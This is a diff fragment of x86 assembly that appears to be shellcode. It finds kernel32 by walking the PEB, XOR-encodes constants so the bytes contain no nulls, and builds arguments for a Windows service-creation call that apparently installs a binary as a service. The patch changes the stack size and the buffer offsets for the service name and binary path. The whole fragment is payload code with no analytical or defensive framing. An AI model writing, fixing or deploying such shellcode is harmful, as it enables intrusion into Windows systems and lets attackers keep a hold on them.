@@ -120,7 +120,7 @@ main:
     mov  ebp, esp
     xor  ecx, ecx
     mov  ecx, 0x01010301
-    xor  ecx, 0x01010201
+    xor  ecx, 0x01010101
     sub  esp, ecx
 
     ; Bootstrap: find kernel32 via PEB walk
@@ -268,7 +268,7 @@ wf_create_service:
     push eax                      ; lpdwTagId
     xor  eax, eax
     push eax                      ; lpLoadOrderGroup
-    lea  eax, [ebp-0x98]
+    lea  eax, [ebp-0x118]
     push eax                      ; lpBinaryPathName
     xor  eax, eax
     push eax                      ; dwErrorControl
@@ -281,9 +281,9 @@ wf_create_service:
     mov  eax, 0x010e03fe
     xor  eax, 0x01010201
     push eax                      ; dwDesiredAccess
-    lea  eax, [ebp-0x8c]
+    lea  eax, [ebp-0x10c]
     push eax                      ; lpDisplayName
-    lea  eax, [ebp-0x8c]
+    lea  eax, [ebp-0x10c]
     push eax                      ; lpServiceName
     mov  eax, [ebp-0x40]
     push eax                      ; hSCManager
